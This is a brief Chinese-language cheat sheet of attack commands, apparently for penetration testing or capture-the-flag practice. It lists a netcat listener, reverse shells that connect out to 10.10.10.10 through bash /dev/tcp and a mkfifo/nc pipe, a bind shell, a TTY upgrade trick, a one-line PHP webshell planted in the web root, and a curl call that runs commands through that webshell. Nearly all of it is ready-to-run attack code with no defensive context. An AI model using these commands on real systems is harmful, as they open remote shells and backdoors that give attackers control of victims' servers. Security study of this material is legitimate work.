### 启动监听
    nc -lvnp 2348

### 从远程服务器发送反弹shell
    bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'

### 从远程服务器发送另一个反弹shell
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f

### 在远程服务器上启动绑定shell
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i2>&1\|nc -lvnp 1234 >/tmp/f

### 连接到在远程服务器上启动的绑定shell
    nc 10.10.10.10 1234

### 升级shell环境
    python -c 'import pty; pty.spawn("/bin/bash")'
    ctrl+z然后 stty raw -echo然后 fg然后连续按enter两次

### 创建一个webshell php文件
    echo "<?php system(\$_GET['cmd']);?>" >/var/www/html/shell.php

### 在上传的webshell上执行命令
    curl http://SERVER_IP:PORT/shell.php?cmd=id